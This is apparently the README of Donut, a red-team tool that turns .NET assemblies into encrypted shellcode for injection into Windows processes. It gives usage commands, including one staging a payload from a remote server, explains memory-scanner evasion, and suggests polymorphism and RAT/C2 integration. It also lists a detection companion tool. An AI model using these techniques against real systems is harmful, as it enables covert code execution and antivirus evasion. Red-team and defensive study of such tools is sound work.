# Using Donut

![Alt text](https://github.com/TheWover/donut/blob/master/img/donut.PNG?raw=true "General Usage")                                                                                                               
 
Donut is a shellcode generation tool that creates x86 or x64 shellcode payloads from .NET Assemblies. This shellcode may be used to inject the Assembly into arbitrary Windows processes. Given an arbitrary .NET Assembly, parameters, and an entry point (such as Program.Main), it produces position-independent shellcode that loads it from memory. The .NET Assembly can either be staged from a URL or stageless by being embedded directly in the shellcode. Either way, the .NET Assembly is encrypted with the SPECK symmetric encryption algorithm and a randomly generated key. After the Assembly is loaded through the CLR, the original reference is randomized and freed from memory to deter memory scanners. The Assembly can either be loaded into the default Application Domain or a new one (to allow for running Assemblies in disposable AppDomains).

It can be used in several ways.

## As a Standalone Tool

Donut can be used as-is to generate shellcode from arbitrary .NET Assemblies. Both a Windows EXE and a Python script are provided for payload generation. The command-line syntax is as described below.

```

 usage: donut [options] -f <.NET assembly> | -u <URL hosting donut module>

       -f <path>            .NET assembly to embed in PIC and DLL.
       -u <URL>             HTTP server hosting the .NET assembly.
       -c <namespace.class> The assembly class name.
       -m <method>          The assembly method name.
       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.
       -a <arch>            Target architecture : 1=x86, 2=amd64(default).
 examples:

    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll
    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/

```

## As a Library

donut is provided in *.dll* and *.lib* format to be used as a library. It has a simple API that is described in *api.html*. Several exported functions are provided, including ``` int CreatePayload(PDONUT_CONFIG c) ```. They all use the PDONUT_CONFIG struct as input.

## As a Template

Part of why donut was published was to provide a template for custom shellcode generators. Since all of the logic for the shellcode is defined in *payload.c*, that logic can be customized by simply changing the *payload* source code. Once the source code is changed, use the provided makefile to rebuild *payload.exe* using any of the following options

```
make x86
make x64
make debug
make clean
```

Once the new version of *payload.exe* is built, its executable code must be extracted. This can be done with *xbin.exe*. To extract the code, run the command below:

```
xbin.exe payload.exe .text
```

This will update *payload.bin* with the new machine code. This stub represents the shellcode component loads the .NET Assembly. When *donut* is used, it will combine this .bin file with the Assembly to produce the usable shellcode.

Additional features are left as exercises to the reader. I would personally recommend:

* Add environmental keying
* Make donut polymorphic by obfuscating *payload* every time shellcode is generated
* Integrate donut as a module into your favorite RAT/C2 Framework

## Disclaimers

* No, we will not update donut to counter signatures or detections by any AV.
* We are not responsible for any misuse of this software or technique. Donut is provided as a demonstration of CLR Injection through shellcode in order to provide red teamers a way to emulate adversaries and defenders a frame of reference for building analytics and mitigations. This inevitably runs the risk of malware authors and threat actors misusing it. However, we believe that the net benefit outweighs the risk. Hopefully that is correct.

# How it works

## Procedure

Donut uses the Unmanaged CLR Hosting API to load the Common Language Runtime. If necessary, the Assembly is downloaded into memory. Either way, it is decrypted. Once the CLR is loaded into the host process, an AppDomain is prepared. Unless told to do otherwise, the shellcode will use DefaultDomain. Otherwise, a new AppDomain will be created. Once the AppDomain is ready, the .NET Assembly is loaded through AppDomain.Load_3. Finally, the Entry Point specified by the user is invoked with any specified parameters.

The logic above describes how the shellcode generated by donut works. That logic is defined in *payload.exe*. To get the shellcode, *xbin.exe* extracts the compiled machine code from *.text* in *payload.exe* and saves it to *payload.bin*. *donut.exe* uses that extracted shellcode, and combines it with a Donut Instance ( a struct wrapper for the Assembly) and a Donut Module (a struct containing the config for the shellcode). The Instance and Module are referred to using offsets rather than stored on the stack. This ensures that the shellcode may be used with any injection technique without setting up the stack manually or using an API call in the CreateThread family.

Refer to MSDN for documentation on the Undocumented CLR Hosting API: https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces

For a standalone example of a CLR Host, refer to Casey Smith's AssemblyLoader repo: https://github.com/caseysmithrc/AssemblyLoader

## Components

Donut contains the following elements:

* donut.c: The source code for the donut payload generator
* donut.exe: The compiled payload generator as an EXE
* donut.py: The donut payload generator as a Python script
* donut.dll, donut.lib: Donut as a library for use in other projects
* payload.c: The source code for the shellcode
* payload.exe: The compiled payload. The shellcode is extracted from this binary file.
* xbin.cpp: Source code for xbin
* xbin.exe: Extracts the useful machine code from payload.exe so that it may be used as shellcode
* encrypt.c: Provides the source code the encryption
* loader.cs, loader.dll: An example .NET Assembly. It starts a process that was specified by a command-line argument.
* clib.c: Overrides Microsoft's definition of memset because they're a PITA and don't want to let us write our own code

Additionally, there are three companion projects provided with donut:

* DonutTest: A simple C# shellcode injector to use in testing donut. The shellcode must be base64 encoded and copied in as a string. 
* ProcessManager: A Process Discovery tool that offensive operators may use to determine what to inject into and defensive operators may use to determine what is running, what properties those processes have, and whether or not they have the CLR loaded. 
* ModuleMonitor: A proof-of-concept tool that detect CLR injection as it is done by tools such as donut and Cobalt Strike's execute-assembly.

# Project plan

Current goal: Beat the other team to publication! ;-)

* Add the option to load the .NET Assembly into a new Application Domain rather than DefaultDomain
* After the Assembly is loaded into the AppDomain (but before it is run), randomize the bytes for the decrypted Assembly and free them. This is to prevent memory scanners from picking up the presence of a DLL in the incorrect part of memory.
* Create a donut.py generator that uses the same command-line parameters as donut.exe
* Clean up the code. Remove code that is not used. Ensure code is internally documented.
* Write documentation with enough detail for users to use donut as a library/API, and for them to use it as operators trying to quickly generate shellcode for one-time use. (this is mostly already done)
* Odzhan write a blog post on the technical implementation of donut and its API. TheWover write a blog post on how to use this as an operator, how it affects red team tradecraft, and potential detection mechanisms for the technique.
